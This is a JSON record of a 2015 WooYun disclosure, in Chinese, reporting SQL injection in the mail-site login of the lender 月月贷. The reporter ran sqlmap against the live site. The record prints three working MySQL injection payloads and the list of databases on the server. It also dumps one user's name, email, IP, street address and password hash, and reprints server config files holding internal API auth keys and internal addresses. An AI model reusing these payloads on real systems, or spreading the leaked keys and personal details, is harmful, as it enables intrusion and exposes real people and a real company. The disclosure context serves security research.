{"id": 77938, "wybug_id": "wooyun-2015-0161516", "wybug_title": "月月贷某站点SQL注入导致部分企业详细信息泄漏（姓名\\电话\\地址\\域名）", "wybug_corp": "月月贷", "wybug_author": "路人甲", "wybug_date": "2015-12-15 15:39", "wybug_open_date": "2016-01-28 17:10", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-12-15：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2016-01-28：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： RT 详细说明：  https://mail.yueyuedai.com/mm-ms/?module=base&action=login登陆框存在SQL注入\n\n直接丢进SQLMAP里面跑了一圈\nParameter: username (POST)    Type: boolean-based blind    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause    Payload: username=a' RLIKE (SELECT (CASE WHEN (2102=2102) THEN 0x61 ELSE 0x28 END)) AND 'ghiS'='ghiS&password=admin123&captcha=D2C0    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause    Payload: username=a' AND (SELECT 6368 FROM(SELECT COUNT(*),CONCAT(0x716b6b6b71,(SELECT (ELT(6368=6368,1))),0x71626a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'WdKf'='WdKf&password=admin123&captcha=D2C0    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)    Payload: username=a' AND (SELECT * FROM (SELECT(SLEEP(5)))mDNX) AND 'krqq'='krqq&password=admin123&captcha=D2C0---web application technology: Nginx, PHP 5.3.20back-end DBMS: MySQL >= 5.0.0available databases [12]:[*] cacti[*] information_schema[*] mm-mls[*] mm-ms[*] mm-ms-old[*] mm-notice[*] mm-pool[*] mm-track[*] mm-widget[*] mysql[*] performance_schema[*] zxc\n发现权限比较高，碰巧遇到了info.php。得到了绝对路径，不过多次尝试写入的时候写入失败了\n\n   漏洞证明：  恰巧跑了一下agent_user这个表\n\n发现一个奇葩的账号\n| 64       | <blank>                     | NULL    | NULL                        | <blank>         | 10086@qq.com          | <blank>       | 何先生         | 113.90.227.156  | 2014-07-01 09:43:58 | 福建省福州市鼓楼区梅竹路77号         | 61070部队           | $1$TTwc6mfs$v1cPt6eLp9zxuF9ibMp4/0 | 0        | 61070部队\n密码没法破解。就查看了下相关的域名总数\n\n提取了几个相关的\n\n利用mysql root权限读取了部分文件，发现部分是内网进行认证的\n//邮件服务器配置$api_mmbs = array();$api_mmbs[] = array(\t'serverid' => '001',\t'describe' => '计费服务器',\t'function' => array('serv'),\t#'api_path' => 'http://127.0.0.1/api_bs/api.php',\t'api_path' => 'http://127.0.0.1:5000/api',\t#'auth_key' => 'qyQ2NFFm8aDH86m2XMs38jU8wc3d6T',\t'auth_key' => 'oDerVOA0Dfh6qAk5J#5tem12j.eRJd',);$api_mmbs[] = array(\t'serverid' => '002',\t'describe' => '回执服务器',\t'function' => array('data'),\t'auth_key' => 'oDerVOA0Dfh6qAk5J#5tem12j.eRJd',\t'api_path' => 'http://192.168.50.27:88/api/api.php',);/*$api_mmbs[] = array(\t'serverid' => '002',\t'describe' => '回执服务器',\t'function' => array('data'),\t'auth_key' => 'oDerVOA0Dfh6qAk5J#5tem12j.eRJd',\t'api_path' => 'http://127.0.0.1/api/api.php',);*///Web客户端接口配置$api_webclient = array(\t#'url' => 'http://127.0.0.1/api/api.php?t=webclient',\t'url' => 'http://127.0.0.1:5001/task?',\t'key' => 'oDerVOA0Dfh6qAk5J#5tem12j.eRJd',);//无效地址库接口配置$api_invalid = array(\t#'api_path' => \"http://127.0.0.1/api_bs/mongo.php\",\t'api_path' => 'http://127.0.0.1:5000/mongo',\t#'auth_key' => 'qyQ2NFFm8aDH86m2XMs38jU8wc3d6T',\t'auth_key' => 'oDerVOA0Dfh6qAk5J#5tem12j.eRJd',);\n数据库连接。(密码已经替换为password)就是没有找到可以写的地方，不然就还可以内网遨游一番了\n<?php//数据库设置$db_config['default'] = array(\t'hostname'     => '127.0.0.1',\t'username' => 'edm_web',\t'password' => 'password',\t'dbname'   => 'mm-ms',\t'charset'  => 'UTF8',\t'dbtype'   => 'mysql',);//用户地址池$db_config['pool'] = array(\t'hostname'     => '127.0.0.1',\t'username' => 'edm_web',\t'password' => 'password',\t'dbname'   => 'mm-pool',\t'charset'  => 'UTF8',\t'dbtype'   => 'mysql',);//跟踪数据库$db_config['track'] = array(\t'hostname'     => '127.0.0.1',\t'username' => 'edm_web',\t'password' => 'password',\t'dbname'   => 'mm-track',\t'charset'  => 'UTF8',\t'dbtype'   => 'mysql',);//邮件列表订阅者数据库$db_config['subscriber'] = array(\t'hostname'     => '127.0.0.1',\t'username' => 'edm_web',\t'password' => 'password',\t'dbname'   => 'mm-mls',\t'charset'  => 'UTF8',\t'dbtype'   => 'mysql',);//小工具数据库$db_config['widget'] = array(\t'host'     => '127.0.0.1',\t'username' => 'edm_web',\t'password' => 'password',\t'dbname'   => 'mm-widget',\t'charset'  => 'UTF8',\t'dbtype'   => 'mysql',);\n   修复方案：     版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}